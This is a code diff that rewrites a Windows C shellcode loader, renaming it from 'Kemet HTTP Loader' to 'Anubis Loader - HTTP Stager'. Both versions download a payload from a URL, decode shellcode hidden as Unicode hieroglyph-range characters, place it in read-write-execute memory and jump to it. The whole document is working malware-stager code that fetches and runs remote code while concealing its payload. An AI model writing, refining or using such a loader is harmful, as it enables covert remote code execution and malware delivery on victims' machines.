@@ -2,153 +2,209 @@
 #include <stdlib.h>
 #include <string.h>
 #include <windows.h>
-#include <stdint.h>
 #include <wininet.h>
+#include <stdint.h>
 
-// Tell the linker to connect to the WinINet library
 #pragma comment(lib, "wininet.lib")
 
-#define MAX_DOWNLOAD_SIZE (4 * 1024 * 1024) // 4MB, enough for most shellcode
+// Function to download payload from URL
+BYTE* DownloadPayload(const char* url, DWORD* payloadSize) {
+    HINTERNET hInternet = NULL;
+    HINTERNET hUrl = NULL;
+    BYTE* buffer = NULL;
+    DWORD bytesRead = 0;
+    DWORD totalBytesRead = 0;
+    DWORD bufferSize = 4096;
+    BYTE tempBuffer[4096];
 
-// Downloads a file from a URL into a buffer
-char* download_from_url(const char* url, size_t* content_size) {
-    HINTERNET internet = InternetOpen("KemetLoader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (!internet) return NULL;
+    printf("[*] Downloading payload from: %s\n", url);
 
-    HINTERNET url_handle = InternetOpenUrl(internet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
-    if (!url_handle) {
-        InternetCloseHandle(internet);
+    // Initialize WinINet
+    hInternet = InternetOpenA("AnubisLoader/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (!hInternet) {
+        printf("[!] InternetOpenA failed: %lu\n", GetLastError());
         return NULL;
     }
 
-    // Allocate a large buffer
-    char* buffer = malloc(MAX_DOWNLOAD_SIZE);
+    // Open URL
+    hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+    if (!hUrl) {
+        printf("[!] InternetOpenUrlA failed: %lu\n", GetLastError());
+        InternetCloseHandle(hInternet);
+        return NULL;
+    }
+
+    // Allocate initial buffer
+    buffer = (BYTE*)malloc(bufferSize);
     if (!buffer) {
-        InternetCloseHandle(url_handle);
-        InternetCloseHandle(internet);
-        return NULL;
+        printf("[!] Failed to allocate memory for download buffer\n");
+        goto cleanup;
     }
 
-    DWORD total_bytes_read = 0;
-    DWORD bytes_read_this_time;
-
-    // Read the file in chunks until it's done
-    while (InternetReadFile(url_handle, buffer + total_bytes_read, 1024, &bytes_read_this_time) && bytes_read_this_time > 0) {
-        total_bytes_read += bytes_read_this_time;
-        // Prevent buffer overflow
-        if (total_bytes_read >= MAX_DOWNLOAD_SIZE) break;
-    }
-
-    // Clean up internet handles
-    InternetCloseHandle(url_handle);
-    InternetCloseHandle(internet);
-
-    // If we downloaded nothing, free the buffer and fail
-    if (total_bytes_read == 0) {
-        free(buffer);
-        return NULL;
-    }
-
-    // Resize the buffer to the actual size of the content and add a null terminator
-    char* final_buffer = realloc(buffer, total_bytes_read + 1);
-    if (final_buffer) {
-        final_buffer[total_bytes_read] = '\0'; // Make it a valid C string
-    } else {
-        // If realloc fails, the original buffer is still valid
-        buffer[total_bytes_read] = '\0';
-        final_buffer = buffer;
-    }
-
-    *content_size = total_bytes_read;
-    return final_buffer;
-}
-
-// Decodes the special Unicode text into shellcode bytes
-unsigned char* decode_content(const char* utf8_buffer, size_t* shellcode_len) {
-    // Convert UTF-8 to wide characters
-    size_t buffer_size = strlen(utf8_buffer);
-    wchar_t* wide_chars = malloc((buffer_size + 1) * sizeof(wchar_t));
-    MultiByteToWideChar(CP_UTF8, 0, utf8_buffer, -1, wide_chars, buffer_size + 1);
-    
-    // Count how many bytes we will get
-    size_t count = 0;
-    for (int i = 0; wide_chars[i] != 0; i++) {
-        if (wide_chars[i] >= 0xD800 && wide_chars[i] <= 0xDBFF) i++; // Skip surrogate pair part
-        count++;
-    }
-    
-    // Allocate memory for the final shellcode
-    unsigned char* shellcode = malloc(count);
-    const int UNICODE_BASE = 0x13000;
-    int shellcode_index = 0;
-    
-    // Convert each character to a shellcode byte
-    for (int i = 0; wide_chars[i] != 0; i++) {
-        uint32_t unicode_value;
-        if (wide_chars[i] >= 0xD800 && wide_chars[i] <= 0xDBFF) {
-            // Handle surrogate pairs
-            uint32_t high = wide_chars[i] & 0x3FF;
-            i++;
-            uint32_t low = wide_chars[i] & 0x3FF;
-            unicode_value = 0x10000 + (high << 10) + low;
-        } else {
-            unicode_value = wide_chars[i];
+    // Read data in chunks
+    while (InternetReadFile(hUrl, tempBuffer, sizeof(tempBuffer), &bytesRead) && bytesRead > 0) {
+        // Resize buffer if needed
+        if (totalBytesRead + bytesRead > bufferSize) {
+            bufferSize *= 2;
+            BYTE* newBuffer = (BYTE*)realloc(buffer, bufferSize);
+            if (!newBuffer) {
+                printf("[!] Failed to reallocate memory for download buffer\n");
+                free(buffer);
+                buffer = NULL;
+                goto cleanup;
+            }
+            buffer = newBuffer;
         }
-        
-        shellcode[shellcode_index] = (unsigned char)(unicode_value - UNICODE_BASE);
-        shellcode_index++;
+
+        // Copy chunk to main buffer
+        memcpy(buffer + totalBytesRead, tempBuffer, bytesRead);
+        totalBytesRead += bytesRead;
     }
-    
-    free(wide_chars);
-    *shellcode_len = count;
-    return shellcode;
+
+    if (totalBytesRead == 0) {
+        printf("[!] Failed to download payload or empty response\n");
+        free(buffer);
+        buffer = NULL;
+        goto cleanup;
+    }
+
+    printf("[*] Downloaded %lu bytes\n", totalBytesRead);
+    *payloadSize = totalBytesRead;
+
+cleanup:
+    if (hUrl) InternetCloseHandle(hUrl);
+    if (hInternet) InternetCloseHandle(hInternet);
+    return buffer;
 }
 
 int main(int argc, char* argv[]) {
-    printf("=== Kemet HTTP Loader ===\n");
-    
-    if (argc < 2) {
-        printf("[!] Usage: %s <URL>\n", argv[0]);
+    if (argc != 2) {
+        printf("Usage: %s <payload_url>\n", argv[0]);
+        printf("Example: %s http://example.com/payload.bin\n", argv[0]);
         return 1;
     }
     
-    printf("[*] Downloading from: %s\n", argv[1]);
+    printf("=== Anubis Loader - HTTP Stager ===\n");
     
-    // Stage 1: Download
-    size_t content_size = 0;
-    char* utf8_buffer = download_from_url(argv[1], &content_size);
+    // Download payload from URL
+    DWORD file_size = 0;
+    char* utf8_buffer = (char*)DownloadPayload(argv[1], &file_size);
     if (!utf8_buffer) {
-        printf("[!] Failed to download file.\n");
+        printf("[!] Failed to download payload from URL\n");
         return 1;
     }
-    printf("[*] Downloaded %zu bytes\n", content_size);
     
-    // Stage 2: Decode
-    size_t len;
-    unsigned char* shellcode = decode_content(utf8_buffer, &len);
-    free(utf8_buffer); // We don't need the downloaded text anymore
+    printf("[*] Payload size: %lu bytes\n", file_size);
     
+    // Convert UTF-8 to wide characters
+    int wide_chars = MultiByteToWideChar(CP_UTF8, 0, utf8_buffer, file_size, NULL, 0);
+    if (wide_chars <= 0) {
+        printf("[!] Failed to calculate wide character buffer size\n");
+        free(utf8_buffer);
+        return 1;
+    }
+    
+    wchar_t* wide_buffer = malloc(wide_chars * sizeof(wchar_t));
+    if (!wide_buffer) {
+        printf("[!] Failed to allocate memory for wide buffer\n");
+        free(utf8_buffer);
+        return 1;
+    }
+    
+    int converted = MultiByteToWideChar(CP_UTF8, 0, utf8_buffer, file_size, wide_buffer, wide_chars);
+    free(utf8_buffer);
+    
+    if (converted <= 0) {
+        printf("[!] Failed to convert to wide characters\n");
+        free(wide_buffer);
+        return 1;
+    }
+    
+    // Decode shellcode from Unicode characters
+    size_t shellcode_len = 0;
+    const uint32_t base_unicode = 0x13000;
+    
+    for (int i = 0; i < converted; i++) {
+        uint32_t char_code;
+        
+        if ((wide_buffer[i] >= 0xD800) && (wide_buffer[i] <= 0xDBFF) && 
+            (i + 1 < converted) && 
+            (wide_buffer[i + 1] >= 0xDC00) && (wide_buffer[i + 1] <= 0xDFFF)) {
+            uint32_t high_surrogate = wide_buffer[i] & 0x3FF;
+            uint32_t low_surrogate = wide_buffer[i + 1] & 0x3FF;
+            char_code = 0x10000 + (high_surrogate << 10) + low_surrogate;
+            i++;
+        } else {
+            char_code = (uint32_t)wide_buffer[i];
+        }
+        
+        if (char_code >= base_unicode && char_code <= base_unicode + 0xFF) {
+            shellcode_len++;
+        }
+    }
+    
+    if (shellcode_len == 0) {
+        printf("[!] No valid shellcode bytes found\n");
+        free(wide_buffer);
+        return 1;
+    }
+    
+    printf("[*] Expected shellcode length: %zu bytes\n", shellcode_len);
+    
+    unsigned char* shellcode = malloc(shellcode_len);
     if (!shellcode) {
-        printf("[!] Failed to decode content.\n");
+        printf("[!] Failed to allocate memory for shellcode\n");
+        free(wide_buffer);
         return 1;
     }
     
-    printf("[*] Decoded %zu bytes of shellcode.\n", len);
+    size_t shellcode_index = 0;
+    for (int i = 0; i < converted && shellcode_index < shellcode_len; i++) {
+        uint32_t char_code;
+        
+        if ((wide_buffer[i] >= 0xD800) && (wide_buffer[i] <= 0xDBFF) && 
+            (i + 1 < converted) && 
+            (wide_buffer[i + 1] >= 0xDC00) && (wide_buffer[i + 1] <= 0xDFFF)) {
+            uint32_t high_surrogate = wide_buffer[i] & 0x3FF;
+            uint32_t low_surrogate = wide_buffer[i + 1] & 0x3FF;
+            char_code = 0x10000 + (high_surrogate << 10) + low_surrogate;
+            i++;
+        } else {
+            char_code = (uint32_t)wide_buffer[i];
+        }
+        
+        if (char_code >= base_unicode && char_code <= base_unicode + 0xFF) {
+            shellcode[shellcode_index++] = (unsigned char)(char_code - base_unicode);
+        }
+    }
     
-    // Stage 3: Execute
-    void* exec_mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    memcpy(exec_mem, shellcode, len);
+    free(wide_buffer);
     
-    DWORD old_protect;
-    VirtualProtect(exec_mem, len, PAGE_EXECUTE_READ, &old_protect);
+    printf("[*] Decoded %zu bytes\n", shellcode_index);
+    printf("[*] First 32 bytes: ");
+    for (size_t i = 0; i < (shellcode_index < 32 ? shellcode_index : 32); i++) {
+        printf("%02X ", shellcode[i]);
+    }
+    printf("\n");
     
+    // Allocate executable memory and execute shellcode
+    void* exec_mem = VirtualAlloc(NULL, shellcode_index, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!exec_mem) {
+        printf("[!] VirtualAlloc failed\n");
+        free(shellcode);
+        return 1;
+    }
+    
+    memcpy(exec_mem, shellcode, shellcode_index);
+    
+    printf("[*] Shellcode allocated at: %p\n", exec_mem);
     printf("[*] Press Enter to execute...");
     getchar();
     
+    // Execute shellcode
     void (*shellcode_func)() = (void (*)())exec_mem;
     shellcode_func();
     
-    // Clean up (will likely not be reached)
     free(shellcode);
     VirtualFree(exec_mem, 0, MEM_RELEASE);
     
